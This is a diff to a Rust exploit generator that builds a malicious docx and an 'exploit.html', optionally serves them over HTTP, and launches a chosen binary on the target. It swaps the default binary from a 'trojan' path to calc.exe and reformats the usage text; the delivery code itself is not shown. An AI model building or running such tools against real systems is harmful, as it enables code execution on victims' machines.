@@ -26,7 +26,7 @@ fn main() {
     let args: Vec<_> = std::env::args().collect();
     let docx_name = "document.docx".to_string();
     let html_name = "exploit.html".to_string();
-    let mut binary = "\\\\users\\\\jpeplu\\\\documents\\\\trojan";
+    let mut binary = "\\\\windows\\\\system32\\\\calc";
     let mut ip: IpAddr = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
     let mut port = 8080;
     let mut start_httpd = false;
@@ -60,7 +60,7 @@ fn main() {
                 if args.len() > 2 {
                     binary = args[2].trim();
                 } else {
-                    binary = "c:\\windows\\system32\\calc.exe"
+                    binary = "\\\\windows\\\\system32\\\\calc.exe"
                 }
             }
         } else {
@@ -128,9 +128,28 @@ Configuration:
 }
 
 fn usage(cmd: &str) {
-    println!("Usage: {} <ip addr> <port> <binary to execute>             # Manual mode : Only genetrates docx and html files ", cmd);
-    println!("Usage: {} --server <binary to execute>                     # Server mode : Genetrates docx and html files and bind a web server to localhost:8080", cmd);
-    println!("Usage: {} --server <network interface> <binary to execute> # Server mode : Genetrates docx and html files and bind a web server to iface_ip_addr:8080", cmd);
+    println!(
+        "Usage: {} <ip addr> <port> <binary to execute>             
+        # Manual mode : Only genetrates docx and html files ",
+        cmd
+    );
+    println!(
+        "Usage: {}
+        # Manual mode : Only genetrates docx and html files pointing to 127.0.0.1:8080 and launching calc.exe",
+        cmd
+    );
+    println!("Usage: {} --server
+        # Server mode : Genetrates docx and html files and bind a web server to localhost:8080, the exploit launches calc.exe", cmd);
+    println!(
+        "Usage: {} --server <binary to execute>                     
+        # Server mode : Genetrates docx and html files and bind a web server to localhost:8080",
+        cmd
+    );
+    println!(
+        "Usage: {} --server <network interface> <binary to execute> 
+        # Server mode : Genetrates docx and html files and bind a web server to iface_ip_addr:8080",
+        cmd
+    );
     println!(
         "Usage: {} --help                                           # Print this message.",
         cmd
